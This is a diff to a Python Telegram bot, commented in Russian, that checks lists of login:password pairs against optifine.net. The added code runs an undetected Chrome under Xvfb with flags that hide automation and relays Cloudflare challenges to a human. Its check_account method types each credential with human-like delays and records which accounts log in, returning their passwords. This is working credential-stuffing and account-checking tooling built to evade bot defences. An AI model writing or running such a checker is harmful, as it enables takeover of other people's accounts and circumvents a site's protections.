@@ -8,9 +8,9 @@ import random
 import subprocess
 import tempfile
 import pickle
+import signal
 from datetime import datetime
 from typing import Dict, List, Tuple
-from urllib.parse import urlparse
 
 # Используем undetected_chromedriver
 import undetected_chromedriver as uc
@@ -65,11 +65,58 @@ class OptifineChecker:
     def __init__(self):
         self.driver = None
         self.session_id = None
+        self.xvfb_process = None
         logger.info("🚀 Инициализация OptifineChecker...")
     
-    def init_driver(self, headless=True):
+    def start_xvfb(self):
+        """Запускает Xvfb для эмуляции дисплея"""
+        try:
+            # Проверяем, не запущен ли уже Xvfb
+            result = subprocess.run(['pgrep', 'Xvfb'], capture_output=True)
+            if result.returncode == 0:
+                logger.info("✅ Xvfb уже запущен")
+                return True
+            
+            # Запускаем Xvfb
+            logger.info("🖥️ Запускаю Xvfb...")
+            self.xvfb_process = subprocess.Popen(
+                ['Xvfb', ':99', '-screen', '0', '1920x1080x24'],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            
+            # Устанавливаем DISPLAY
+            os.environ['DISPLAY'] = ':99'
+            
+            # Ждем запуска
+            time.sleep(2)
+            
+            logger.info("✅ Xvfb запущен")
+            return True
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка запуска Xvfb: {e}")
+            return False
+    
+    def stop_xvfb(self):
+        """Останавливает Xvfb"""
+        if self.xvfb_process:
+            try:
+                self.xvfb_process.terminate()
+                self.xvfb_process.wait(timeout=5)
+                logger.info("✅ Xvfb остановлен")
+            except:
+                pass
+    
+    def init_driver(self, headless=False):
         """Инициализация драйвера"""
         try:
+            # Запускаем Xvfb если нужно
+            if not headless:
+                if not self.start_xvfb():
+                    logger.error("❌ Не удалось запустить Xvfb")
+                    return False
+            
             logger.info("🔍 Определяю версию Chrome...")
             
             # Получаем версию Chrome
@@ -77,9 +124,9 @@ class OptifineChecker:
                 chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                 chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                 logger.info(f"✅ Обнаружена версия Chrome: {chrome_version}")
-            except:
+            except Exception as e:
                 chrome_version = 145
-                logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}")
+                logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}. Ошибка: {e}")
             
             # Создаем временную директорию для профиля
             user_data_dir = tempfile.mkdtemp()
@@ -90,6 +137,7 @@ class OptifineChecker:
             # Основные настройки
             if headless:
                 options.add_argument('--headless=new')
+            
             options.add_argument('--no-sandbox')
             options.add_argument('--disable-dev-shm-usage')
             options.add_argument('--window-size=1920,1080')
@@ -123,10 +171,14 @@ class OptifineChecker:
             options.add_argument(f'--user-data-dir={user_data_dir}')
             options.add_argument('--profile-directory=Default')
             
-            # Устанавливаем DISPLAY для Xvfb
-            os.environ['DISPLAY'] = ':99'
+            # Дополнительные настройки для видимого режима
+            if not headless:
+                options.add_argument('--disable-blink-features=AutomationControlled')
+                options.add_argument('--disable-features=VizDisplayCompositor')
+                options.add_argument('--disable-features=IsolateOrigins')
+                options.add_argument('--disable-features=site-per-process')
             
-            logger.info(f"🚀 Запускаю undetected_chromedriver...")
+            logger.info(f"🚀 Запускаю undetected_chromedriver в режиме {'headless' if headless else 'visible'}...")
             
             self.driver = uc.Chrome(
                 options=options,
@@ -150,6 +202,7 @@ class OptifineChecker:
             
         except Exception as e:
             logger.error(f"❌ Ошибка инициализации: {e}")
+            logger.exception("Детали ошибки:")
             return False
     
     def save_session(self, session_id):
@@ -237,7 +290,7 @@ class OptifineChecker:
         """Ожидает ручного подтверждения от пользователя"""
         
         start_time = time.time()
-        check_interval = 5  # проверяем каждые 5 секунд
+        check_interval = 5
         
         while time.time() - start_time < timeout:
             try:
@@ -248,17 +301,24 @@ class OptifineChecker:
                 
                 # Обновляем страницу каждые 30 секунд
                 elapsed = int(time.time() - start_time)
-                if elapsed % 30 == 0:
+                if elapsed % 30 == 0 and elapsed > 0:
                     logger.info(f"🔄 Обновляю страницу (прошло {elapsed}с)")
-                    self.driver.refresh()
+                    try:
+                        self.driver.refresh()
+                    except:
+                        pass
                 
                 # Отправляем статус каждые 30 секунд
                 if elapsed % 30 == 0 and elapsed > 0:
-                    await update.message.reply_text(
-                        f"⏳ **Ожидание подтверждения...**\n"
-                        f"Прошло: {elapsed}с\n"
-                        f"Осталось: {timeout - elapsed}с"
-                    )
+                    try:
+                        await update.message.reply_text(
+                            f"⏳ **Ожидание подтверждения...**\n"
+                            f"Прошло: {elapsed}с\n"
+                            f"Осталось: {timeout - elapsed}с\n\n"
+                            f"🆔 ID: `{session_id}`"
+                        )
+                    except:
+                        pass
                 
                 await asyncio.sleep(check_interval)
                 
@@ -280,6 +340,9 @@ class OptifineChecker:
             logger.info("🌐 Открываю страницу входа...")
             self.driver.get("https://optifine.net/login")
             time.sleep(5)
+            
+            # Сохраняем скриншот
+            self.driver.save_screenshot(f'/app/debug/cloudflare_{session_id}.png')
             
             # Проверяем, может Cloudflare уже пройден?
             if self.check_cloudflare_passed():
@@ -366,7 +429,6 @@ class OptifineChecker:
                     "✅ **Cloudflare успешно пройден!**\n\n"
                     "Продолжаю проверку аккаунтов..."
                 )
-                # Сигнал для продолжения
                 return True
             else:
                 await query.edit_message_text(
@@ -384,13 +446,154 @@ class OptifineChecker:
                     f"Текущий URL:\n"
                     f"{session_info['checker'].driver.current_url}"
                 )
-            except:
-                await query.edit_message_text("❌ **Ошибка при обновлении**")
+            except Exception as e:
+                await query.edit_message_text(f"❌ **Ошибка при обновлении:** {str(e)[:100]}")
         
         elif data.startswith('cf_cancel'):
             # Отменяем операцию
             await query.edit_message_text("❌ **Операция отменена**")
             del pending_confirmations[session_id]
+    
+    async def check_account(self, login: str, password: str) -> Dict:
+        """Проверка аккаунта"""
+        logger.info(f"🔍 Проверяю: {login[:20]}...")
+        
+        if not self.driver:
+            return {'login': login, 'status': 'error', 'error': 'Драйвер не инициализирован'}
+        
+        try:
+            # Поиск поля логина
+            email_field = None
+            email_selectors = [
+                "//input[@name='username']",
+                "//input[@name='email']",
+                "//input[@type='text']",
+                "//input[@type='email']",
+                "//input[@placeholder='Username']",
+                "//input[@placeholder='Email']"
+            ]
+            
+            for selector in email_selectors:
+                elements = self.driver.find_elements(By.XPATH, selector)
+                for element in elements:
+                    if element.is_displayed():
+                        email_field = element
+                        logger.info(f"✅ Найдено поле логина")
+                        break
+                if email_field:
+                    break
+            
+            if not email_field:
+                return {'login': login, 'status': 'error', 'error': 'Поле логина не найдено'}
+            
+            # Поиск поля пароля
+            password_field = None
+            password_selectors = [
+                "//input[@type='password']",
+                "//input[@name='password']",
+                "//input[@name='pass']"
+            ]
+            
+            for selector in password_selectors:
+                elements = self.driver.find_elements(By.XPATH, selector)
+                for element in elements:
+                    if element.is_displayed():
+                        password_field = element
+                        logger.info(f"✅ Найдено поле пароля")
+                        break
+                if password_field:
+                    break
+            
+            if not password_field:
+                return {'login': login, 'status': 'error', 'error': 'Поле пароля не найдено'}
+            
+            # Поиск кнопки входа
+            submit_button = None
+            submit_selectors = [
+                "//button[@type='submit']",
+                "//input[@type='submit']",
+                "//button[contains(text(), 'Login')]",
+                "//button[contains(text(), 'Sign in')]"
+            ]
+            
+            for selector in submit_selectors:
+                elements = self.driver.find_elements(By.XPATH, selector)
+                for element in elements:
+                    if element.is_displayed() and element.is_enabled():
+                        submit_button = element
+                        logger.info(f"✅ Найдена кнопка входа")
+                        break
+                if submit_button:
+                    break
+            
+            if not submit_button:
+                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
+            
+            # Очищаем поля
+            try:
+                email_field.clear()
+            except:
+                pass
+            try:
+                password_field.clear()
+            except:
+                pass
+            
+            # Вводим логин
+            logger.info(f"✍️ Ввожу логин...")
+            for char in login:
+                email_field.send_keys(char)
+                time.sleep(random.uniform(0.03, 0.07))
+            
+            time.sleep(random.uniform(0.5, 1))
+            
+            # Вводим пароль
+            logger.info(f"✍️ Ввожу пароль...")
+            for char in password:
+                password_field.send_keys(char)
+                time.sleep(random.uniform(0.03, 0.07))
+            
+            time.sleep(random.uniform(0.5, 1))
+            
+            # Нажимаем кнопку
+            logger.info("🖱️ Нажимаю кнопку входа")
+            try:
+                submit_button.click()
+            except:
+                self.driver.execute_script("arguments[0].click();", submit_button)
+            
+            # Ждем результат
+            time.sleep(5)
+            
+            # Анализируем результат
+            current_url = self.driver.current_url
+            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
+            
+            if 'downloads' in current_url or 'profile' in current_url:
+                logger.info(f"✅ РАБОЧИЙ АККАУНТ: {login[:20]}")
+                return {
+                    'login': login,
+                    'password': password,
+                    'status': 'valid'
+                }
+            elif 'invalid' in page_text or 'incorrect' in page_text:
+                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
+                return {
+                    'login': login,
+                    'status': 'invalid',
+                    'error': 'Неверный логин/пароль'
+                }
+            else:
+                logger.info(f"⚠️ НЕОПРЕДЕЛЕННЫЙ РЕЗУЛЬТАТ: {login[:20]}")
+                return {
+                    'login': login,
+                    'status': 'invalid',
+                    'error': 'Неопределенный результат'
+                }
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка при проверке: {e}")
+            return {'login': login, 'status': 'error', 'error': str(e)[:100]}
     
     def close(self):
         """Закрытие драйвера"""
@@ -400,6 +603,7 @@ class OptifineChecker:
                 logger.info("✅ Драйвер закрыт")
             except:
                 pass
+        self.stop_xvfb()
 
 # --- Telegram handlers ---
 
@@ -410,6 +614,10 @@ async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     try:
+        if not os.path.exists('/app/debug'):
+            await update.message.reply_text("📁 Папка /app/debug не найдена")
+            return
+        
         files = os.listdir('/app/debug')
         if not files:
             await update.message.reply_text("📁 Папка debug пуста")
@@ -420,6 +628,9 @@ async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sent = 0
         for file in files[:5]:
             file_path = os.path.join('/app/debug', file)
+            if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 10MB
+                continue
+                
             with open(file_path, 'rb') as f:
                 await update.message.reply_document(
                     document=f,
@@ -462,9 +673,12 @@ async def process_file(file_path, update, context):
         
         await msg.edit_text(f"📊 Аккаунтов: {total}\n\n🛡️ **Настраиваю ручное прохождение Cloudflare...**")
         
-        # Инициализируем драйвер (НЕ headless для ручного режима)
+        # Инициализируем драйвер (visible режим с Xvfb)
         if not checker.init_driver(headless=False):
-            await msg.edit_text("❌ **Ошибка инициализации драйвера**")
+            await msg.edit_text(
+                "❌ **Ошибка инициализации драйвера**\n\n"
+                "Проверь логи через /debug"
+            )
             return
         
         # Запрашиваем ручное прохождение Cloudflare
@@ -595,7 +809,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     
     # Проверяем, это кнопка подтверждения Cloudflare?
-    if query.data.startswith('cf_'):
+    if query.data and query.data.startswith('cf_'):
         # Создаем временный экземпляр для обработки
         checker = OptifineChecker()
         await checker.handle_confirmation_callback(update, context)
@@ -639,6 +853,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ **Нужен .txt файл**")
         return
     
+    if doc.file_size > 10 * 1024 * 1024:  # 10MB
+        await update.message.reply_text("❌ **Файл слишком большой (>10MB)**")
+        return
+    
     try:
         file = await context.bot.get_file(doc.file_id)
         path = f"temp_{update.effective_user.id}_{doc.file_name}"
@@ -668,6 +886,8 @@ def main():
         app.run_polling()
     except Exception as e:
         logger.error(f"Ошибка: {e}")
+    finally:
+        print("👋 Бот остановлен")
 
 if __name__ == '__main__':
     main()
